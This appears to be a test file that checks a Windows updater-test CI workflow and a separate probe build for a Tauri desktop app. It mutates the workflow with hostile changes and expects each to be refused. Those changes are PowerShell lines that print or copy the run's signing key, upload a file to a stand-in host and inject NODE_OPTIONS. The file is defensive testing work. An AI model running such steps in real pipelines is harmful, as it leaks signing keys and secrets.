    it('sets each version it builds from its own input through version:set, handing the input over env, never pasted', () => {
      const setting = steps.filter((step) => /\bversion:set\b/.test(step.run ?? ''))

      expect(setting.map((step) => step.env?.['VERSION'])).toEqual(['${{ inputs.version }}', '${{ inputs.update_version }}'])
      for (const step of setting) expect(step.run).toContain('$env:VERSION')
    })

    it('builds the two apps of one test at the same time as other tests, but never the same pair twice: its concurrency group names both versions', () => {
      expect((workflow as Workflow & { concurrency?: unknown }).concurrency).toEqual({
        group: 'updater-test-windows-${{ inputs.version }}-${{ inputs.update_version }}',
        'cancel-in-progress': true,
      })
    })

    it('has no repository secret, no variable and no release key: the key is made in the run', () => {
      expect(text).not.toMatch(/secrets\.|vars\.|TAURI_SIGNING|updater-artifacts|createUpdaterArtifacts/)
    })

    it('builds with the config the run made, which derives from the committed test config and carries no key of its own', () => {
      const made = runs.join('\n')

      expect(made).toContain('updater:test-config -- config')
      expect(made).toContain('--out $conf')
      expect(testConfig.plugins?.updater).not.toHaveProperty('pubkey')
    })

    it('uploads the two installers, the update’s signature and the manifest by exact name, kept for 3 days', () => {
      const upload = steps.find((step) => step.uses?.startsWith('actions/upload-artifact@'))

      expect(String(upload?.with?.['path']).trim().split('\n')).toEqual([
        'updater-test-out/ListulatorUpdaterTest_${{ inputs.version }}_x64-setup.exe',
        'updater-test-out/ListulatorUpdaterTest_${{ inputs.update_version }}_x64-setup.exe',
        'updater-test-out/ListulatorUpdaterTest_${{ inputs.update_version }}_x64-setup.exe.sig',
        'updater-test-out/latest.json',
      ])
      expect(upload?.with?.['retention-days']).toBe(3)
    })

    it('runs the update test once, last: after the upload, and after the key is deleted, so the test never has the key on its disk', () => {
      const names = steps.map((step) => step.name ?? step.uses ?? '')
      const at = (matching: RegExp) => steps.findIndex((step) => matching.test(`${step.run ?? ''} ${step.uses ?? ''}`))
      const testing = steps.filter((step) => /\btest:desktop-update\b/.test(step.run ?? ''))

      expect(testing).toHaveLength(1)
      expect(at(/\btest:desktop-update\b/)).toBeGreaterThan(at(/upload-artifact/))
      expect(at(/\btest:desktop-update\b/)).toBeGreaterThan(at(/Remove-Item/))
      expect(testing[0]?.run?.split('\n').map((line) => line.trim())).toEqual(['npm run test:desktop-update -- updater-test-out', 'if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }', ''])
      expect(names.at(-1)).toMatch(/update test/i)
    })

    // The last step of the real workflow, as the hostile cases below move, repeat and drop it.
    const TEST_STEP =
      '      - name: The update test (installs the older app, updates it the way a person does, checks it, removes it)\n' +
      '        shell: pwsh\n' +
      '        run: |\n' +
      '          npm run test:desktop-update -- updater-test-out\n' +
      '          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }\n'

    // Each change below breaks one rule of the throw-away key (S1 to S4); the real workflow, changed in that one place, must be refused.
    const hostile: [string, (t: string) => string, RegExp][] = [
      ['a key made without --ci', (t) => t.replace('signer generate --ci', 'signer generate'), /not made with --ci/],
      ['a second key', (t) => t.replace('Write-Output "::add-mask::', 'npm run tauri -w @listulator/desktop -- signer generate --ci -w $key\n          Write-Output "::add-mask::'), /makes 2 keys/],
      ['a key in the checkout, not the temp folder', (t) => t.replace("$key = Join-Path $env:RUNNER_TEMP 'updater-test-run.key'", "$key = 'updater-test-run.key'"), /not a file in the runner's temp folder in every step/],
      ['a key file named elsewhere', (t) => t.replace('-f $key', '-f D:\\keys\\other.key'), /outside the runner's temp folder|signs with something other than the key file/],
      ['no hiding of the key in the log', (t) => t.replace(/ *Write-Output "::add-mask::[^\n]*\n/, ''), /does not hide the key/],
      ['the key printed', (t) => t.replace(/Write-Output "::add-mask::[^\n]*/, 'Get-Content $key'), /reads or prints the key|does not hide the key/],
      ['the key printed after it is hidden', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          Write-Host (Get-Content $key)\n          Write-Output'), /reads or prints the key outside the line that hides it/],
      ['the key copied to the upload folder', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          Copy-Item $key updater-test-out\n          Write-Output'), /reads or prints the key outside the line that hides it/],
      ['signing with the key text on the command line', (t) => t.replace('-f $key', '-k $env:KEY'), /signs with something other than the key file|key text on the command line/],
      ['signing without a version', (t) => t.replace(' --app-version $env:UPDATE_VERSION', ''), /without --app-version/],
      ['a key that is not deleted when the run fails', (t) => t.replace('if: always()', 'if: success()'), /does not delete the key in a step that always runs/],
      ['a key deleted before its last use', (t) => t.replace(/ {6}- name: Delete the run's key[^\n]*\n(?: {8}[^\n]*\n)+/, ''), /does not delete the key|deletes the key before/],
      ['a value handed on through GITHUB_ENV', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          "K=1" >> $env:GITHUB_ENV\n          Write-Output'), /outlives a step/],
      ['a value handed on through GITHUB_OUTPUT', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          "k=1" >> $env:GITHUB_OUTPUT\n          Write-Output'), /outlives a step/],
      ['a trace of every command', (t) => t.replace('$key = Join-Path', 'Set-PSDebug -Trace 1\n          $key = Join-Path'), /tracing, a transcript or verbose/],
      ['a second job', (t) => t + '\n  other:\n    runs-on: windows-2025\n    timeout-minutes: 5\n    steps:\n      - run: echo hi\n', /jobs \(the key must live in exactly one\)/],
      ['a cache that could carry the key between runs', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/cache@${'a'.repeat(40)} # v1\n        with:\n          path: x\n          key: y\n      - name: Install dependencies`), /a way to carry the key between runs/],
      ['an upload of everything in the folder', (t) => t.replace('updater-test-out/latest.json', 'updater-test-out/'), /not an exact file name/],
      ['an upload with a wildcard', (t) => t.replace('updater-test-out/latest.json', 'updater-test-out/*'), /not an exact file name/],
      ['an upload of the temp folder', (t) => t.replace('updater-test-out/latest.json', '${{ runner.temp }}/updater-test-run.key'), /not an exact file name/],
      ['an upload of a key file by name', (t) => t.replace('updater-test-out/latest.json', 'updater-test-out/updater-test-run.key'), /not an exact file name/],
      ['an artifact kept a week', (t) => t.replace('retention-days: 3', 'retention-days: 7'), /not kept for exactly 3 days/],
      ['a second upload', (t) => t + `\n      - uses: actions/upload-artifact@${'b'.repeat(40)} # v1\n        with:\n          name: z\n          path: updater-test-out/latest.json\n          retention-days: 3\n`, /2 upload-artifact steps/],
      ['no verification of the signed installer', (t) => t.replace('updater:test-config -- verify', 'echo skipped'), /does not verify the signed installer/],
      ['no check of the upload folder', (t) => t.replace('updater:test-config -- staging', 'echo skipped'), /does not check the upload folder/],
      ['a build that does not use the run config', (t) => t.replace(/--config \$conf/, '--config src-tauri/tauri.updater-test.conf.json'), /does not use the run config/],
      ['a build of more than the installer', (t) => t.replace(/--bundles nsis/, '--bundles all'), /makes more than the installer/],
      // The security review's probes (2026-10-21): each of these passed the first version of the rules.
      ['the key read by a .NET call and printed', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          $k = [IO.File]::ReadAllText($key); Write-Output ($k.ToCharArray() -join " ")\n          Write-Output'), /outside the allowed commands/],
      ['the key printed through a path built in the line', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Write-Output (Get-Content (Join-Path $env:RUNNER_TEMP 'updater-test-run.key') -Raw)\n          Write-Output"), /outside the allowed commands/],
      ['the key copied to the upload folder by its path', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Copy-Item (Join-Path $env:RUNNER_TEMP 'updater-test-run.key') updater-test-out\n          Write-Output"), /outside the allowed commands/],
      ['$key moved by an assignment', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          $key += '/../../x'\n          Write-Output"), /outside the allowed commands/],
      ['$key redefined by a variable cmdlet', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          Set-Variable -Name ke -Value 'x'\n          Write-Output"), /variable cmdlets/],
      ['the temp folder listed by its literal path', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', 'exit $LASTEXITCODE }\n          Get-ChildItem D:\\a\\_temp\n          Write-Output'), /outside the allowed commands|the runner's temp folder by its literal path/],
      ['a verification that is switched off', (t) => t.replace('      - name: The update verifies against this run\'s key, fails against the real one, and is newer\n', "      - name: The update verifies against this run's key, fails against the real one, and is newer\n        if: false\n"), /a step has an if: other than/],
      ['a staging check behind a condition', (t) => t.replace('      - name: Nothing to upload holds the key\n', "      - name: Nothing to upload holds the key\n        if: ${{ inputs.version != 'x' }}\n"), /a step has an if: other than/],
      ['the delete step with a different condition', (t) => t.replace('if: always()', 'if: failure()'), /does not delete the key in a step that always runs|a step has an if: other than/],
      ['the staging check commented out', (t) => t.replace('npm run updater:test-config -- staging', '# npm run updater:test-config -- staging'), /does not check the upload folder/],
      ['the hiding of the key commented out', (t) => t.replace('Write-Output "::add-mask::', '# Write-Output "::add-mask::'), /does not hide the key|outside the allowed commands/],
      ['a staging check whose failure is ignored', (t) => t.replace('--key-file $key\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }', '--key-file $key\n          exit 0'), /not followed by its exit-code check|forces a success/],
      ['a check followed by exit 0 on the same line', (t) => t.replace('--installed-version $env:VERSION', '--installed-version $env:VERSION; exit 0'), /outside the allowed commands|forces a success/],
      ['a deletion that deletes nothing (-WhatIf)', (t) => t.replace('-Force -ErrorAction SilentlyContinue', '-Force -WhatIf'), /outside the allowed commands|does not delete/],
      ['a deletion of another file', (t) => t.replace("'updater-test-run.key*'", "'nothing.key*'"), /outside the allowed commands|does not delete/],
      ['the wrong file embedded as the public key', (t) => t.replace('--pubkey-file "$key.pub" --out $conf', '--pubkey-file "$key" --out $conf'), /outside the allowed commands/],
      ['a cache action that could save the temp folder', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/cache/save@${'a'.repeat(40)} # v1\n        with:\n          path: \${{ runner.temp }}\n          key: y\n      - name: Install dependencies`), /outside the allowed three/],
      ['an artifact merge action', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/upload-artifact/merge@${'a'.repeat(40)} # v1\n        with:\n          name: x\n      - name: Install dependencies`), /outside the allowed three/],
      ['a script action that could read the key', (t) => t.replace('      - name: Install dependencies', `      - uses: actions/github-script@${'a'.repeat(40)} # v1\n        with:\n          script: return 1\n      - name: Install dependencies`), /outside the allowed three/],
      ['a .NET upload of a file', (t) => t.replace('exit $LASTEXITCODE }\n          Write-Output', "exit $LASTEXITCODE }\n          [Net.WebClient]::new().UploadFile('http://example.invalid', 'x')\n          Write-Output"), /network or upload command/],
      ['a first step that no longer checks the two versions', (t) => t.replace(/-notmatch/g, '-match'), /does not check the two versions first/],
      ['the version check moved after the checkout', (t) => t.replace(/ {6}- name: The versions are versions[\s\S]*?(?= {6}- uses: actions\/checkout)/, '').replace('      - name: Install dependencies', '      - name: The versions are versions\n        shell: pwsh\n        env:\n          VERSION: ${{ inputs.version }}\n          UPDATE_VERSION: ${{ inputs.update_version }}\n        run: |\n          if ($env:VERSION -notmatch "^x$" -or $env:UPDATE_VERSION -notmatch "^x$") { throw "no" }\n      - name: Install dependencies'), /does not check the two versions first/],
      // The update test (31.7) may run only with the key gone and the files kept, on the one folder, once, and never skipped.
      ['the update test before the key is deleted', (t) => t.replace(TEST_STEP, '').replace('      - uses: actions/upload-artifact@', `${TEST_STEP}      - uses: actions/upload-artifact@`), /before the key is deleted/],
      ['the update test twice', (t) => `${t.replace(/\n*$/, '\n')}${TEST_STEP}`, /runs the update test 2 times/],
      ['the update test aimed at another folder', (t) => t.replace('test:desktop-update -- updater-test-out', 'test:desktop-update -- .'), /update test is not exactly/],
      ['the update test whose failure is ignored', (t) => t.replace('test:desktop-update -- updater-test-out\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }', 'test:desktop-update -- updater-test-out\n          exit 0'), /not followed by its exit-code check|forces a success/],
      ['the update test behind a condition', (t) => t.replace('        shell: pwsh\n        run: |\n          npm run test:desktop-update', '        if: false\n        shell: pwsh\n        run: |\n          npm run test:desktop-update'), /a step has an if: other than/],
      ['no update test at all', (t) => t.replace(TEST_STEP, ''), /runs the update test 0 times/],
      // The security review's probes (2026-10-21, 31.7): the same code reached without the one literal, and a step that carries more than its two lines.
      ['the update test run early through npm exec', (t) => t.replace('      - uses: actions/upload-artifact@', '      - name: Early\n        shell: pwsh\n        run: |\n          npm exec tsx server/src/tools/desktopUpdateTestRun.ts -- updater-test-out\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }\n      - uses: actions/upload-artifact@'), /update test|desktopUpdateTestRun/],
      ['the Playwright config of the update test run early', (t) => t.replace('      - uses: actions/upload-artifact@', '      - name: Early\n        shell: pwsh\n        run: |\n          node node_modules/@playwright/test/cli.js test -c web/playwright.desktop.config.ts\n          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }\n      - uses: actions/upload-artifact@'), /update test|playwright\.desktop/],
      ['the update test with an environment of its own', (t) => t.replace('        shell: pwsh\n        run: |\n          npm run test:desktop-update', '        env:\n          NODE_OPTIONS: --require x.js\n        shell: pwsh\n        run: |\n          npm run test:desktop-update'), /update test step has more than/],
      ['the update test with a line more', (t) => t.replace('          npm run test:desktop-update -- updater-test-out\n', '          npm run test:desktop-update -- updater-test-out\n          Get-ChildItem\n'), /update test step has more than|not exactly/],
      ['a secret', (t) => t.replace('      - name: Install dependencies\n        run: npm ci --ignore-scripts', '      - name: Install dependencies\n        env:\n          K: ${{ secrets.KEY }}\n        run: npm ci --ignore-scripts'), /secret or the token/],
      ['a push trigger', (t) => t.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n  workflow_dispatch:'), /not by hand only/],
    ]

    it.each(hostile)('refuses %s', (_name, change, expected) => {
      const changed = change(text)

      expect(changed).not.toBe(text)
      expect(workflowProblems(loadYaml(changed) as Workflow, 'updaterTest').join(' | ')).toMatch(expected)
    })

    it('is judged as strictly as a manual workflow by the manual profile too, apart from the one signature it uploads', () => {
      const problems = workflowProblems(workflow, 'manual').join(' | ')

      expect(problems).toMatch(/\.sig file/)
      expect(problems.replace(/job [\w-]+: upload-artifact takes a \.sig file[^|]*/, '').replace(/ \| $/, '')).toBe('')
    })
  })
})

/**
 * The probe build (20.16, DECISIONS 2026-10-12). The probes of the security review (the isolation hook, the navigation guard, the
 * updater's shapes) need a build with an inspector, and they must never run in an app that holds the owner's library. So the debug
 * profile of the hand-started Windows workflow builds a SEPARATE app: its own product name (its own install folder and uninstall
 * entry) and identifier (its own data folder). Nothing else differs from the release config, so the capabilities, the hook and the
 * CSP under test are the shipped ones. No release path can reach the file.
 */
describe('the probe build', () => {
  const ROOT = join(import.meta.dirname, '../..')
  const read = (path: string) => readFileSync(join(ROOT, path), 'utf8')
  const PROBE_CONFIG = 'apps/desktop/src-tauri/tauri.probe.conf.json'
  const PROBE_ARGUMENT = 'src-tauri/tauri.probe.conf.json'
  const probe = JSON.parse(read(PROBE_CONFIG)) as { productName?: string; identifier?: string } & Record<string, unknown>
  const release = JSON.parse(read('apps/desktop/src-tauri/tauri.conf.json')) as { productName: string; identifier: string }
  const others = ['tauri.updater-test.conf.json', 'tauri.dev.conf.json'].map((name) => JSON.parse(read(`apps/desktop/src-tauri/${name}`)) as { productName?: string; identifier: string })

  it('is a separate app: its own product name and identifier, different from the release app, the updater test app and the dev app', () => {
    expect(probe.identifier).toBe('com.listulator.desktop.probe')
    expect(probe.productName).toBe('ListulatorProbe')
    for (const other of [release, ...others]) {
      expect(probe.identifier).not.toBe(other.identifier)
      if (other.productName !== undefined) expect(probe.productName).not.toBe(other.productName)
    }
  })

  it('changes nothing but the name and the identifier: the capabilities, the hook, the CSP and the updater are the shipped ones', () => {
    expect(Object.keys(probe).sort()).toEqual(['$schema', 'identifier', 'productName'])
  })

  it('is passed by the debug branch of the manual Windows workflow only, never by the release branch', () => {
    const lines = read('.github/workflows/desktop-windows.yml').split('\n').filter((line) => /\btauri:build\b/.test(line))
    const debug = lines.filter((line) => line.includes('--debug'))
    const shipped = lines.filter((line) => !line.includes('--debug'))

    expect(debug).toHaveLength(1)
    expect(debug[0]).toContain(`--config ${PROBE_ARGUMENT}`)
    expect(shipped).toHaveLength(1)
    expect(shipped[0]).not.toMatch(/--config/)
  })

  it('is never named by the release workflow, the updater-artifacts overlay, the updater test workflow or the release config', () => {
    for (const file of ['.github/workflows/release.yml', '.github/workflows/updater-test-windows.yml', 'apps/desktop/src-tauri/tauri.updater-artifacts.conf.json', 'apps/desktop/src-tauri/tauri.conf.json', 'apps/desktop/src-tauri/tauri.updater-test.conf.json']) {
      expect(read(file), file).not.toMatch(/tauri\.probe|ListulatorProbe|desktop\.probe/)
    }
  })
})
